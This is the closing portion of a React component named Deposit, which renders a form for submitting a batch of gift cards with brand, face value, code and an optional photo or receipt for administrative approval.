                      <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Brand / Retailer</label>
                      <select
                        value={card.brand}
                        onChange={(e) => handleUpdateGiftCard(card.id, 'brand', e.target.value)}
                        className="w-full bg-white dark:bg-gray-900 border border-slate-200 dark:border-gray-800 rounded-xl px-3 py-2 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                      >
                        <option value="Amazon Giftcard">Amazon Giftcard</option>
                        <option value="Apple iTunes Giftcard">Apple iTunes Giftcard</option>
                        <option value="Steam Wallet Card">Steam Wallet Card</option>
                        <option value="Google Play Card">Google Play Card</option>
                        <option value="Razer Gold Card">Razer Gold Card</option>
                        <option value="eBay Giftcard">eBay Giftcard</option>
                        <option value="Vanilla Visa/Mastercard">Vanilla Visa / Mastercard</option>
                        <option value="Nordstrom / Sephora">Nordstrom / Sephora</option>
                        <option value="Other Retail Card">Other Retail Card</option>
                      </select>
                    </div>

                    <div>
                      <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Face Value (USD)</label>
                      <input
                        type="number"
                        required
                        placeholder="100"
                        value={card.amount}
                        onChange={(e) => handleUpdateGiftCard(card.id, 'amount', e.target.value)}
                        className="w-full bg-white dark:bg-gray-900 border border-slate-200 dark:border-gray-800 rounded-xl px-3 py-2 text-xs font-mono font-bold text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Gift Card Code / Serial Number</label>
                    <input
                      type="text"
                      required
                      placeholder="AQ89-3991-8842-KL99"
                      value={card.code}
                      onChange={(e) => handleUpdateGiftCard(card.id, 'code', e.target.value)}
                      className="w-full bg-white dark:bg-gray-900 border border-slate-200 dark:border-gray-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                    />
                  </div>

                  {/* Image Upload for Gift Card */}
                  <div className="pt-1">
                    <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1 flex items-center justify-between">
                      <span className="flex items-center gap-1">
                        <ImageIcon className="w-3.5 h-3.5 text-emerald-600 dark:text-[#00FFB2]" />
                        <span>Card Image / Receipt Proof (Optional)</span>
                      </span>
                      {card.imageProofUrl && (
                        <button
                          type="button"
                          onClick={() => {
                            handleUpdateGiftCard(card.id, 'imageProofUrl', '');
                            handleUpdateGiftCard(card.id, 'imageFileName', '');
                          }}
                          className="text-rose-500 dark:text-rose-400 text-[10px] hover:underline"
                        >
                          Clear Image
                        </button>
                      )}
                    </label>

                    {card.imageProofUrl ? (
                      <div className="flex items-center gap-3 p-2 rounded-xl bg-white dark:bg-gray-900 border border-emerald-500/40">
                        <img
                          src={card.imageProofUrl}
                          alt="Card proof"
                          className="w-12 h-12 object-cover rounded-lg border border-slate-200 dark:border-gray-700"
                        />
                        <div className="flex-1 overflow-hidden">
                          <p className="text-xs font-semibold text-emerald-600 dark:text-emerald-300 truncate">
                            {card.imageFileName || 'giftcard_proof.jpg'}
                          </p>
                          <p className="text-[10px] text-slate-500 dark:text-gray-400">Attached for administrative verification</p>
                        </div>
                        <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mr-2" />
                      </div>
                    ) : (
                      <label className="flex items-center justify-center gap-2 p-3 rounded-xl border border-dashed border-slate-300 dark:border-gray-700 hover:border-emerald-500 dark:hover:border-[#00FFB2] bg-white dark:bg-gray-900/40 hover:bg-slate-100 dark:hover:bg-gray-900 text-slate-500 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white cursor-pointer transition">
                        <UploadCloud className="w-4 h-4 text-emerald-600 dark:text-[#00FFB2]" />
                        <span className="text-[11px] font-medium">Click to upload photo of card or receipt</span>
                        <input
                          type="file"
                          accept="image/*"
                          className="hidden"
                          onChange={(e) => handleGiftCardImageUpload(card.id, e)}
                        />
                      </label>
                    )}
                  </div>
                </div>
              ))}
            </div>

            {/* Add Another Card Button */}
            <button
              type="button"
              onClick={handleAddGiftCard}
              className="w-full py-2.5 rounded-xl border border-dashed border-slate-300 dark:border-gray-700 hover:border-emerald-500 dark:hover:border-[#00FFB2] text-slate-600 dark:text-gray-300 hover:text-emerald-600 dark:hover:text-[#00FFB2] bg-slate-100/50 dark:bg-gray-900/40 font-bold text-xs flex items-center justify-center gap-2 transition cursor-pointer"
            >
              <Plus className="w-4 h-4" />
              <span>Add Another Gift Card to this Batch</span>
            </button>

            {/* Submit All Cards Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-4 rounded-xl bg-[#00FFB2] hover:bg-[#00E59E] text-black font-black text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 cursor-pointer flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <span>Submitting Batch to Vault...</span>
              ) : (
                <>
                  <Gift className="w-4 h-4" />
                  <span>Submit {giftCards.length} Giftcard(s) for Approval (${totalGiftCardAmount.toLocaleString()})</span>
                </>
              )}
            </button>
          </form>
        </div>
      )}
    </div>
  );
};
export default Deposit;
